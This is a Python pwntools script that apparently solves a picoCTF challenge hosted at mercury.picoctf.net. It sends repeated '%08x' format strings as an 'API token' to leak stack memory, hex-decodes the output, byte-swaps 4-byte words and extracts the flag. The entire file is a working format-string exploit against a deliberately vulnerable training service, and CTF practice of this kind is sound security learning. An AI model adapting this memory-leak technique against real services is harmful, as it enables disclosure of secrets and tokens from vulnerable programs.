from pwn import *

import binascii

host = "mercury.picoctf.net"; port = 27912
arr = [b'p', b'i', b'c', b'o', b'C', b'T', b'F', b'{', b'}']
fstring = ''
for i in range(50):

	fstring += '%08x' * 10
	print("USING: " + fstring)
	r = remote(host, port)
	r.recvuntil(b"portfolio\n")
	r.sendline(b"1")
	r.recvuntil(b"API token?\n")
	r.sendline(fstring)
	r.recvuntil("token:\n")
	response_hex = r.recv().decode().split("\n")[0]
	print(response_hex)
	ascii_response = bytes.fromhex(response_hex)
	print(ascii_response)

	check = [x for x in arr if x in ascii_response]
	if(len(check) == len(arr)):
		print()
		print()
		print("FOUND!!!")
		print()
		print()
		print(f'before = {ascii_response}')
		ascii_response = (b'ocip' + ascii_response.split(b'ocip')[1]).split(b'}')[0] + b'}'
		print(f'after spliting = {ascii_response}')

		result = ""
		for i in range(0, len(ascii_response) - 3, 4):
			result += chr(ascii_response[i + 3]) + chr(ascii_response[i + 2]) + chr(ascii_response[i + 1]) + chr(ascii_response[i + 0])

		result = "picoCTF{" + result.split("{")[1].split("}")[0] + "}"
		r.close()
		break
		
	r.close()

print(f"!!!\n{result}\n!!!")

